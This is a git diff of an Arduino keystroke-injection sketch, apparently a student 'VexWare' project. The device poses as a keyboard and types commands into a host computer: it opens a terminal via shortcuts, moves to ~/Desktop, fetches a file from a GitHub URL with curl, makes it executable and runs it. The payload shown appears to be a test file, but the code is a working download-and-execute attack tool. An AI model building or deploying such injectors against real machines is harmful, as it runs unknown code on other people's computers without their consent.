@@ -11,8 +11,10 @@ Keystroke sequence:
 #include <Keyboard.h>
 
 int hasRun = 0;
-String download = "curl -O https://raw.githubusercontent.com/octocat/Spoon-Knife/master/LICENSE";
-String run = "./file";
+
+// test sl file
+String download = "curl -O https://raw.githubusercontent.com/olincollege/VexWare/master/src/test";
+String run = "./test";
 
 void setup() {
   pinMode(2, INPUT_PULLUP);
@@ -31,8 +33,14 @@ void loop() {
     Keyboard.releaseAll();
     delay(500); // let animation play
 
+    // Try another shortcut
+    Keyboard.press(KEY_LEFT_ALT);
+    Keyboard.press(KEY_RETURN);
+    Keyboard.releaseAll();
+    delay(500); // let animation play   
+
     // Change directory
-    Keyboard.print("cd Desktop");
+    Keyboard.print("cd ~/Desktop");
     Keyboard.press(KEY_RETURN);
     Keyboard.releaseAll();
     delay(500); // let animation play
@@ -44,6 +52,11 @@ void loop() {
     delay(500); // let animation play
 
     // Run file
+    Keyboard.print("chmod +x test");
+    Keyboard.press(KEY_RETURN);
+    Keyboard.releaseAll();
+    delay(500);
+
     Keyboard.print(run);
     Keyboard.press(KEY_RETURN);
     Keyboard.releaseAll();
